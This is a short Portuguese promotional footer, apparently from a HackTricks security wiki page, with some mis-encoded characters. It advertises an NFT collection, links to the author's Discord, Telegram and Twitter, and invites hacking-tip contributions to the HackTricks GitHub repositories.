* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
